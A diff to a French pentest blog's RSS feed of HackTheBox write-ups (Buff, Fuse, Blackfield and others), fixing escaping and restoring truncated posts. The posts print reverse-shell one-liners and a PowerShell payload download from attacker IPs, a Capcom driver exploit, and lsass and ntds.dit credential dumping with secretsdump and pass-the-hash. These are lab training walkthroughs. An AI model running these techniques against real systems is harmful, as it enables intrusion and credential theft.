@@ -8,7 +8,7 @@
     <copyright></copyright>
     <ttl>60</ttl>
 <item>
-<pubDate>2019-05-18T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2019-05-18T11:24:56Z 08:06:09 CET</pubDate>
   <category>2019/05/18/6</category>
   <title>Anatomie d'une attaque informatique</title>
   <link>http://3r1c.net/posts/2019-05-18-anatomie-dune-attaque-informatique.txt</link>
@@ -138,7 +138,7 @@ Tags: pentest</pre>]]>
   <guid>http://3r1c.net/posts/2019-05-18-anatomie-dune-attaque-informatique.txt</guid>
   </item>
 <item>
-<pubDate>2020-06-16T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2020-06-16T11:24:56Z 08:06:09 CET</pubDate>
   <category>2020/06/16/2</category>
   <title>htb blunder</title>
   <link>http://3r1c.net/posts/2020-06-16-blunder.txt</link>
@@ -394,8 +394,7 @@ Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
 
 $ cat /etc/issue
 cat /etc/issue
-Ubuntu 19.10 
- \l
+Ubuntu 19.10 \n \l
 
 $ ls /home
 ls /home
@@ -520,7 +519,7 @@ cat root.txt
   <guid>http://3r1c.net/posts/2020-06-16-blunder.txt</guid>
   </item>
 <item>
-<pubDate>2020-09-02T10:21:56Z 20:07:22 CET</pubDate>
+<pubDate>2020-09-02T10:21:56Z 08:06:09 CET</pubDate>
   <category>2020/09/02/3</category>
   <title>buff</title>
   <link>http://3r1c.net/posts/2020-09-02-buff.txt</link>
@@ -616,8 +615,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ```
 # victim
-C:\xampp\htdocs\gym\upload&gt; powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.15.38:8000/nc.exe&#39;,&#39;C:\xampp\htdocs\gym\upload
-c.exe&#39;)&quot;
+C:\xampp\htdocs\gym\upload&gt; powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.15.38:8000/nc.exe&#39;,&#39;C:\xampp\htdocs\gym\upload\nc.exe&#39;)&quot;
 
 C:\xampp\htdocs\gym\upload&gt; nc.exe -nv 10.10.15.38 40000 -e cmd.exe
 ```
@@ -665,7 +663,7 @@ https://p0i5on8.github.io/posts/hackthebox-buff/
   <guid>http://3r1c.net/posts/2020-09-02-buff.txt</guid>
   </item>
 <item>
-<pubDate>2020-09-29T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2020-09-29T11:24:56Z 08:06:09 CET</pubDate>
   <category>2020/09/29/2</category>
   <title>htb admirer</title>
   <link>http://3r1c.net/posts/2020-09-29-admirer.txt</link>
@@ -937,8 +935,7 @@ admin_tasks.php
                  I&#39;m leaving them in the valid tasks in case I figure out a way
                  to securely run code as root from a PHP page.
       ************************************************************************************/
-      echo str_replace(&quot;
-&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;));
+      echo str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;));
     }
     else
     {
@@ -1058,7 +1055,7 @@ Et notre netcat reçoit la connexion en retour. Nous sommes root.
   <guid>http://3r1c.net/posts/2020-09-29-admirer.txt</guid>
   </item>
 <item>
-<pubDate>2020-10-29T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2020-10-29T11:24:56Z 08:06:09 CET</pubDate>
   <category>2020/10/29/4</category>
   <title>htb fuse</title>
   <link>http://3r1c.net/posts/2020-10-29-fuse.txt</link>
@@ -1166,12 +1163,12 @@ Dans un des fichiers CSV, je découvre quelques utilisateurs, et je pense que j&
 Je teste chaque utilisateur avec ce mot de passe. Pour le compte _tlavel_, la réponse du serveur est &quot;NT_STATUS_PASSWORD_MUST_CHANGE&quot;. Ce qui signifie que le mot de passe est correct mais nécessite un changement.
 
 ```bash
-kali@kali:~/Fuse$ rpcclient -U &quot;fabricorp\perton&quot; 10.10.10.193 
+kali@kali:~/Fuse$ rpcclient -U &quot;fabricorp\\perton&quot; 10.10.10.193 
 Enter FABRICORP\perton&#39;s password: 
 Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
 
-kali@kali:~/Fuse$ rpcclient -U &quot;fabricorp\tlavel&quot; 10.10.10.193 
-Enter FABRICORP	lavel&#39;s password: 
+kali@kali:~/Fuse$ rpcclient -U &quot;fabricorp\\tlavel&quot; 10.10.10.193 
+Enter FABRICORP\tlavel&#39;s password: 
 Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE
 ```
 
@@ -1180,7 +1177,7 @@ Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE
 Je renouvelle le mot de passe du compte `tlavel`.
 
 ```bash
-kali@kali:~/Fuse$ smbpasswd -U &quot;fabricorp\tlavel&quot; -r 10.10.10.193
+kali@kali:~/Fuse$ smbpasswd -U &quot;fabricorp\\tlavel&quot; -r 10.10.10.193
 Old SMB password: &lt;Fabricorp01&gt;
 New SMB password: &lt;p@ssw0rd&gt;
 Retype new SMB password: &lt;p@ssw0rd&gt;
@@ -1192,9 +1189,9 @@ Password changed for user tlavel
 Je constate que vous avons un spooler actif sur ce contrôleur de domaine.
 
 ```bash
-kali@kali:~/fuse$ smbclient -L \\10.10.10.193 -U &quot;fabricorp\tlavel&quot;
+kali@kali:~/fuse$ smbclient -L \\\\10.10.10.193 -U &quot;fabricorp\\tlavel&quot;
 Unable to initialize messaging context
-Enter FABRICORP	lavel&#39;s password: 
+Enter FABRICORP\tlavel&#39;s password: 
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -1215,8 +1212,8 @@ Le mot de passe de `tlavel` est réinitialisé très rapidement. Il faut être r
 ```bash
 rpcclient $&gt; enumprinters 
         flags:[0x800000]
-        name:[\10.10.10.193\HP-MFT01]
-        description:[\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central
+        name:[\\10.10.10.193\HP-MFT01]
+        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central
         (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
         comment:[]
 ```
@@ -1303,7 +1300,7 @@ Modifier :
 ```bash
 static bool LaunchShell()
 {
-    TCHAR CommandLine[] = TEXT(&quot;C:\Windows\system32\cmd.exe&quot;);
+    TCHAR CommandLine[] = TEXT(&quot;C:\\Windows\\system32\\cmd.exe&quot;);
 ```
 
 en :
@@ -1311,7 +1308,7 @@ en :
 ```bash
 static bool LaunchShell()
 {
-    TCHAR CommandLine[] = TEXT(&quot;C:\test\nc.exe -nv 10.10.14.35 443&quot;);
+    TCHAR CommandLine[] = TEXT(&quot;C:\\test\\nc.exe -nv 10.10.14.35 443&quot;);
 ```
 
 Et je le compile ExploitCapcom.cpp avec VS2015.
@@ -1327,24 +1324,24 @@ Je compile également : EoPLoadDriver.cpp [^2]. Il faut passer par un nouveau pr
 
 ## Préparation
 
-Grâce à mon shell Evil-WinRM, j&#39;upload nc.exe dans `c:	est`.
+Grâce à mon shell Evil-WinRM, j&#39;upload nc.exe dans `c:\test`.
 
 ```bash
-*Evil-WinRM* PS C:	est&gt; upload /usr/share/windows-resources/binaries/nc.exe
+*Evil-WinRM* PS C:\test&gt; upload /usr/share/windows-resources/binaries/nc.exe
 ```
 
 J&#39;upload le driver et les deux codes compilés.
 
 ```bash
-*Evil-WinRM* PS C:	est&gt; upload Capcom.sys
-*Evil-WinRM* PS C:	est&gt; upload ExploitCapcom.exe
-*Evil-WinRM* PS C:	est&gt; upload eoploaddriver.exe
+*Evil-WinRM* PS C:\test&gt; upload Capcom.sys
+*Evil-WinRM* PS C:\test&gt; upload ExploitCapcom.exe
+*Evil-WinRM* PS C:\test&gt; upload eoploaddriver.exe
 ```
 
 Je charge le driver Capcom.sys sur la victime.
 
 ```bash
-*Evil-WinRM* PS C:	est&gt; eoploaddriver.exe System\CurrentControlSet\MyService c:	est\Capcom.sys
+*Evil-WinRM* PS C:\test&gt; eoploaddriver.exe System\CurrentControlSet\MyService c:\test\Capcom.sys
 [+] Enabling SeLoadDriverPrivilege
 [+] SeLoadDriverPrivilege Enabled
 [+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
@@ -1358,7 +1355,7 @@ Maintenant je peux utiliser le driver chargé pour l&#39;exploiter et exécuter 
 Et je lance l&#39;exploit. 1er essai avec un reverse shell netcat échoué.
 
 ```bash
-*Evil-WinRM* PS C:	est&gt; .\ExploitCapcom.exe
+*Evil-WinRM* PS C:\test&gt; .\ExploitCapcom.exe
 [*] Capcom.sys exploit
 [*] Capcom.sys handle was obtained as 0000000000000068
 [*] Shellcode was placed at 0000029108910008
@@ -1378,14 +1375,14 @@ Je modifie le code de ExploitCapcom.cpp pour appeler shell.exe
 ```bash
 static bool LaunchShell()
 {
-    TCHAR CommandLine[] = TEXT(&quot;C:\test\shell.exe&quot;);
+    TCHAR CommandLine[] = TEXT(&quot;C:\\test\\shell.exe&quot;);
 ```
 
 J&#39;upload shell.exe et je lance l&#39;exploit.
 
 ```bash
-*Evil-WinRM* PS C:	est&gt; upload shell.exe
-*Evil-WinRM* PS C:	est&gt; .\ExploitCapcom.exe
+*Evil-WinRM* PS C:\test&gt; upload shell.exe
+*Evil-WinRM* PS C:\test&gt; .\ExploitCapcom.exe
 [*] Capcom.sys exploit
 [*] Capcom.sys handle was obtained as 0000000000000064
 [*] Shellcode was placed at 000002345ED10008
@@ -1445,8 +1442,30 @@ UserPrincipalName :
 
 
 ```bash
-*Evil-WinRM* PS C:\users\svc-print\Documents&gt; .\VbLoadDriver.exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService C:\users\svc-print\Documents<item>
-<pubDate>2022-02-17T11:24:56Z 20:07:22 CET</pubDate>
+*Evil-WinRM* PS C:\users\svc-print\Documents&gt; .\VbLoadDriver.exe HKU\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService C:\users\svc-print\Documents\capcom.sys
+VbLoadDriver
+http://vbscrub.com
+
+Attempting to enable SeLoadDriverPrivilege...
+Successfully enabled privilege
+Creating registry values...
+Successfully created registry values
+Loading driver...
+Successfully loaded driver
+*Evil-WinRM* PS C:\users\svc-print\Documents&gt; 
+
+```
+
+
+
+[^2]: https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
+[^1]: https://github.com/tandasat/ExploitCapcom</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2020-10-29-fuse.txt</guid>
+  </item>
+<item>
+<pubDate>2022-02-17T11:24:56Z 08:06:09 CET</pubDate>
   <category>2022/02/17/4</category>
   <title>htb blackfield</title>
   <link>http://3r1c.net/posts/2022-02-17-blackfield-hackthebox.txt</link>
@@ -1538,7 +1557,7 @@ UserPrincipalName :
 
 ### smbclient
 
-	kali@kali:~/blackfield$ smbclient -L \\10.10.10.192
+	kali@kali:~/blackfield$ smbclient -L \\\\10.10.10.192
 	Unable to initialize messaging context
 	Enter WORKGROUP\kali&#39;s password: 
 	
@@ -1555,7 +1574,7 @@ UserPrincipalName :
 Le dossier forensic n&#39;est pas accessible
 
 	kali@kali:~/blackfield$ smbclient  //10.10.10.192/forensic
-	Enter WORKGROUPoots password: 
+	Enter WORKGROUP\roots password: 
 	Try &quot;help&quot; to get a list of possible commands.
 	smb: \&gt; ls
 	NT_STATUS_ACCESS_DENIED listing \*
@@ -1563,7 +1582,7 @@ Le dossier forensic n&#39;est pas accessible
 
 Un autre dossier contient une arborescence de dossiers utilisateurs.
 
-	kali@kali:~/blackfield$ smbclient \\10.10.10.192\profiles$ -U &quot;&quot;
+	kali@kali:~/blackfield$ smbclient \\\\10.10.10.192\\profiles$ -U &quot;&quot;
 	Unable to initialize messaging context
 	Enter WORKGROUP\&#39;s password: 
 	Try &quot;help&quot; to get a list of possible commands.
@@ -1647,7 +1666,7 @@ Connexion Evil-Winrm impossible avec le compte support.
 	kali@kali:~/blackfield$ evil-winrm -i 10.10.10.192 -u blackfield\support -p#00^BlackKnight
 
 
-	kali@kali:~/blackfield$ smbclient \\10.10.10.192\netlogon -U &quot;blackfield\support&quot; 
+	kali@kali:~/blackfield$ smbclient \\\\10.10.10.192\\netlogon -U &quot;blackfield\support&quot; 
 
 En tant que support que puis-je faire ? Quels sont mes privilèges ? 
 
@@ -1706,8 +1725,8 @@ Je modifie le mot de passe du compte `audit2020`.
 Le compte audit2020 est compromis ! Je peux maintenant accéder au contenu du dossier forensic. 
 
 
-	kali@kali:~$ smbclient \\10.10.10.192\forensic -U &quot;blackfield\audit2020&quot; 
-	Enter BLACKFIELD\audit2020&#39;s password: 
+	kali@kali:~$ smbclient \\\\10.10.10.192\\forensic -U &quot;blackfield\\audit2020&quot; 
+	Enter BLACKFIELD\\audit2020&#39;s password: 
 	Try &quot;help&quot; to get a list of possible commands.
 	smb: \&gt; dir
 	  .                                   D        0  Sun Feb 23 08:03:16 2020
@@ -1722,8 +1741,395 @@ Le compte audit2020 est compromis ! Je peux maintenant accéder au contenu du do
 De nouveaux fichiers, de nouvelles lectures :) Je télécharge tout.
 
 	smb: \&gt; cd commands_output\
-	smb: <item>
-<pubDate>2023-08-17T11:24:56Z 20:07:22 CET</pubDate>
+	smb: \commands_output\&gt; dir
+	  .                                   D        0  Sun Feb 23 13:14:37 2020
+	  ..                                  D        0  Sun Feb 23 13:14:37 2020
+	  domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020
+	  domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020
+	  domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020
+	  firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020
+	  ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020
+	  netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020
+	  route.txt                           A     3976  Sun Feb 23 07:53:01 2020
+	  systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020
+	  tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020
+	
+		            7846143 blocks of size 4096. 3676167 blocks available
+	smb: \commands_output\&gt; mget *
+	Get file domain_admins.txt? y
+	getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+	Get file domain_groups.txt? y
+	getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (1.1 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+	Get file domain_users.txt? y
+	getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (23.8 KiloBytes/sec) (average 7.2 KiloBytes/sec)
+	Get file firewall_rules.txt? y
+	getting file \commands_output\firewall_rules.txt of size 518202 as firewall_rules.txt (310.8 KiloBytes/sec) (average 129.4 KiloBytes/sec)
+	Get file ipconfig.txt? y
+	getting file \commands_output\ipconfig.txt of size 1782 as ipconfig.txt (5.2 KiloBytes/sec) (average 119.9 KiloBytes/sec)
+	Get file netstat.txt? y
+	getting file \commands_output\netstat.txt of size 3842 as netstat.txt (7.3 KiloBytes/sec) (average 108.1 KiloBytes/sec)
+	Get file route.txt? y
+	getting file \commands_output\route.txt of size 3976 as route.txt (5.9 KiloBytes/sec) (average 96.0 KiloBytes/sec)
+	Get file systeminfo.txt? y
+	getting file \commands_output\systeminfo.txt of size 4550 as systeminfo.txt (4.5 KiloBytes/sec) (average 82.0 KiloBytes/sec)
+	Get file tasklist.txt? y
+	getting file \commands_output\tasklist.txt of size 9990 as tasklist.txt (6.4 KiloBytes/sec) (average 67.8 KiloBytes/sec)
+	smb: \commands_output\&gt; 
+
+### Fichier lsass.dmp
+
+Un fichier très intéressant, il contiendrait peut être des identifiants capturés en mémoire.
+
+![image-20200616085833142](https://itstiptop.net/assets/img/image-20200616085833142.png)
+
+Le téléchargement du fichier est impossible. Erreur `parallel_read returned NT_STATUS_IO_TIMEOUT`. Je parviens tout de même à le télécharger en montant le share smb.
+
+	kali@kali:~$ sudo mount -t cifs //10.10.10.192/forensic /mnt/ -o user=audit2020
+	Password for audit2020@//10.10.10.192/forensic:  *********
+	kali@kali:~$ cp /mnt/memory_analysis/lsass.zip ./Blackfield/
+	kali@kali:~/Blackfield$ unzip lsass.zip 
+	Archive:  lsass.zip
+	  inflating: lsass.DMP               
+	kali@kali:~/Blackfield$ 
+
+#### Installation de pypykatz
+
+Pypykatz est le Mimikatz offline pour Linux.
+
+	git clone https://github.com/skelsec/pypykatz.git
+	sudo pip3 install minidump minikerberos aiowinreg msldap winsspi
+	cd pypykatz/
+	sudo python3 setup.py install
+
+Et analyse le contenu de lsass.DMP. J&#39;ai maintenant les hash de 2 comptes :
+
+- svc_backup : 9658d1d1dcd9250115e2205d9f48400d
+- administrator : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+
+La sortie est volontairement tronquée :
+
+	kali@kali:~/Blackfield$ sudo pypykatz lsa minidump lsass.DMP
+	INFO:root:Parsing file lsass.DMP
+	FILE: ======== lsass.DMP =======
+	== LogonSession ==
+	authentication_id 406458 (633ba)
+	session_id 2
+	username svc_backup
+	domainname BLACKFIELD
+	logon_server DC01
+	logon_time 2020-02-23T18:00:03.423728+00:00
+	sid S-1-5-21-4194615774-2175524697-3563712290-1413
+	luid 406458
+		    == MSV ==
+		            Username: svc_backup
+		            Domain: BLACKFIELD
+		            LM: NA
+		            NT: 9658d1d1dcd9250115e2205d9f48400d
+		            SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+		    == WDIGEST [633ba]==
+		            username svc_backup
+		            domainname BLACKFIELD
+		            password None
+		    == SSP [633ba]==
+		            username 
+		            domainname 
+		            password None
+		    == Kerberos ==
+		            Username: svc_backup
+		            Domain: BLACKFIELD.LOCAL
+		            Password: None
+		    == WDIGEST [633ba]==
+		            username svc_backup
+		            domainname BLACKFIELD
+		            password None
+	
+	...
+	
+	== LogonSession ==
+	authentication_id 153705 (25869)
+	session_id 1
+	username Administrator
+	domainname BLACKFIELD
+	logon_server DC01
+	logon_time 2020-02-23T17:59:04.506080+00:00
+	sid S-1-5-21-4194615774-2175524697-3563712290-500
+	luid 153705
+		    == MSV ==
+		            Username: Administrator
+		            Domain: BLACKFIELD
+		            LM: NA
+		            NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+		            SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
+		    == WDIGEST [25869]==
+		            username Administrator
+		            domainname BLACKFIELD
+		            password None
+		    == SSP [25869]==
+		            username 
+		            domainname 
+		            password None
+		    == Kerberos ==
+		            Username: Administrator
+		            Domain: BLACKFIELD.LOCAL
+		            Password: None
+		    == WDIGEST [25869]==
+		            username Administrator
+		            domainname BLACKFIELD
+		            password None
+
+Je tente une connexion, mais ce ne sera pas aussi simple :) Le mot de passe de Administrator a pu (et a dû) être renouvelé récemment.
+
+	kali@kali:~/Blackfield$ evil-winrm -i 10.10.10.192 -u administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+	
+	Evil-WinRM shell v2.3
+	Info: Establishing connection to remote endpoint
+	Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+	Error: Exiting with code 1
+
+### Connexion en tant que svc_backup
+
+C&#39;est ok en revanche avec le compte svc_backup
+
+	kali@kali:~/Blackfield$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+	Evil-WinRM shell v2.3
+	Info: Establishing connection to remote endpoint
+	
+	*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami
+	blackfield\svc_backup
+	*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; 
+
+Et le flag user.txt
+
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; cat user.txt
+	92cab391b2f2cac3e09435926ca4469d
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; 
+
+## Priv esc
+
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; whoami /all
+	
+	USER INFORMATION
+	----------------
+	
+	User Name             SID
+	===================== ==============================================
+	blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413
+
+
+	GROUP INFORMATION
+	-----------------
+	
+	Group Name                                 Type             SID          Attributes
+	========================================== ================ ============ ==================================================
+	Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+	BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+	BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+	BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+	BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+	NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+	Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+	PRIVILEGES INFORMATION
+	----------------------
+	
+	Privilege Name                Description                    State
+	============================= ============================== =======
+	SeMachineAccountPrivilege     Add workstations to domain     Enabled
+	SeBackupPrivilege             Back up files and directories  Enabled
+	SeRestorePrivilege            Restore files and directories  Enabled
+	SeShutdownPrivilege           Shut down the system           Enabled
+	SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+	SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+	USER CLAIMS INFORMATION
+	-----------------------
+	
+	User claims unknown.
+	
+	Kerberos support for Dynamic Access Control on this device has been disabled.
+
+### Comment utiliser le privilège SeBackupPrivilege ?
+
+L&#39;utilisateur svc_backup peut réaliser des backups comme l&#39;indique son nom et le privilège SeBackupPrivilege qu&#39;il détient. Ma première idée est de copier ntdis.dit et obtenir le hash du compte Administrator.
+
+Première tentative échouée car je n&#39;ai pas les permissions.
+
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; ntdsutil.exe &#39;ac i ntds&#39; &#39;ifm&#39; &#39;create full c:\temp&#39; q q
+	C:\Windows\system32\ntdsutil.exe: ac i ntds
+	Active instance set to &quot;ntds&quot;.
+	C:\Windows\system32\ntdsutil.exe: ifm
+	ifm: create full c:\temp
+	Creating snapshot...
+	 error 0x5(Access is denied.)
+	IFM media created successfully in c:\temp
+	ifm: q
+	C:\Windows\system32\ntdsutil.exe: q
+
+Il faut un moyen de lire un snapshot, puis de copier les fichiers de se snapshot. J&#39;utilise diskshadow.exe
+
+Je prépare un fichier shadow.txt
+
+	#File shadow.txt
+	set context persistent nowriters
+	set metadata c:\exfil\metadata.cab
+	add volume c: alias trophy
+	create
+	expose %someAlias% z:
+
+Puis je le transferts sur la victime.
+
+	Invoke-WebRequest -Uri &quot;http://10.10.14.2/shadow.txt&quot; -OutFile &quot;shadow.txt&quot;
+
+Le dernier caractère de la première ligne de mon fichier shadow.txt ne semble pas être lu. J&#39;ai donc une erreur (nowriter au lieu de nowriterS).
+
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; diskshadow.exe /s shadow.txt
+	Microsoft DiskShadow version 1.0
+	Copyright (C) 2013 Microsoft Corporation
+	On computer:  DC01,  6/16/2020 8:54:00 AM
+	
+	-&gt; set context persistent nowriter
+	
+	SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }
+	
+		    CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
+		    PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
+		    PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
+		    VOLATILE                Specify that shadow copy will be deleted on exit or reset.
+		    VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.
+	
+		    Example: SET CONTEXT CLIENTACCESSIBLE
+
+J&#39;ajoute donc un caractère &quot;C&quot; à chaque fin de ligne.
+
+	kali@kali:~/Blackfield$ cat shadow.txt
+	set context persistent nowritersC
+	set metadata c:\exfil\metadata.cabC
+	add volume c: alias someAliasC
+	createC
+	expose %someAlias% z:C
+
+Je transferts à nouveau et j&#39;exécute diskshadow.exe
+
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; Invoke-WebRequest -Uri &quot;http://10.10.14.2/shadow.txt&quot; -OutFile &quot;shadow.txt&quot;
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; diskshadow.exe /s shadow.txt
+	Microsoft DiskShadow version 1.0
+	Copyright (C) 2013 Microsoft Corporation
+	On computer:  DC01,  6/16/2020 9:00:04 AM
+	
+	-&gt; set context persistent nowriters
+	-&gt; set metadata c:\exfil\metadata.ca
+	-&gt; add volume c: alias someAlias
+	-&gt; create
+	Alias someAlias for shadow ID {d52a9a78-73aa-4e90-817a-402f13fa02e1} set as environment variable.
+	Alias VSS_SHADOW_SET for shadow set ID {df02dfa1-22a1-4765-8c71-e7bbf320f5f6} set as environment variable.
+	
+	Querying all shadow copies with the shadow copy set ID {df02dfa1-22a1-4765-8c71-e7bbf320f5f6}
+	
+		    * Shadow copy ID = {d52a9a78-73aa-4e90-817a-402f13fa02e1}               %someAlias%
+		            - Shadow copy set: {df02dfa1-22a1-4765-8c71-e7bbf320f5f6}       %VSS_SHADOW_SET%
+		            - Original count of shadow copies = 1
+		            - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
+		            - Creation time: 6/16/2020 9:00:08 AM
+		            - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+		            - Originating machine: DC01.BLACKFIELD.local
+		            - Service machine: DC01.BLACKFIELD.local
+		            - Not exposed
+		            - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		            - Attributes:  No_Auto_Release Persistent No_Writers Differential
+	
+	Number of shadow copies listed: 1
+	-&gt; expose %someAlias% z:
+	-&gt; %someAlias% = {d52a9a78-73aa-4e90-817a-402f13fa02e1}
+	The shadow copy was successfully exposed as z:\.
+
+Je n&#39;ai toujours pas accès au fichier ntds.dit. Normal.
+
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; cp z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
+	Access to the path &#39;z:\windows\ntds\ntds.dit&#39; is denied.
+
+Il faut un moyen de copier en utilisant notre privilège SeBackupPriv. Il suffit d&#39;utiliser 2 DLL ici : https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
+
+	kali@kali:~/Blackfield$ wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true
+	kali@kali:~/Blackfield$ wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true
+
+Et sur la victime j&#39;upload les 2 DLL directement grâce è Evil-Winrm.
+
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; upload SeBackupPrivilegeCmdLets.dll
+	*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; upload SeBackupPrivilegeUtils.dll
+
+Voilà on peut désormais utiliser notre privilège SeBackupPrivilege.
+
+	*Evil-WinRM* PS C:\exfil&gt; Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\exfil\ntds.dit
+
+Pour la suite, on aura aussi besoin de :
+
+	*Evil-WinRM* PS C:\exfil&gt; reg save HKLM\SYSTEM c:\exfil\system
+
+On télécharge sur notre machine attaquant :
+
+	*Evil-WinRM* PS C:\exfil&gt; download system
+	*Evil-WinRM* PS C:\exfil&gt; download ntds.dit
+
+### Dump des NTLM depuis les fichiers ntds.dit et system
+
+Je dump les hashs ntlm.
+
+	kali@kali:~/Blackfield$ secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+	Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+	
+	[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+	[*] Searching for pekList, be patient
+	[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+	[*] Reading and decrypting hashes from ntds.dit 
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
+	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+	audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
+	support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+	BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+	...
+
+Reste à se connecter en admin à l&#39;aide du hash découvert.
+
+	kali@kali:~/Blackfield$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
+	Evil-WinRM shell v2.3
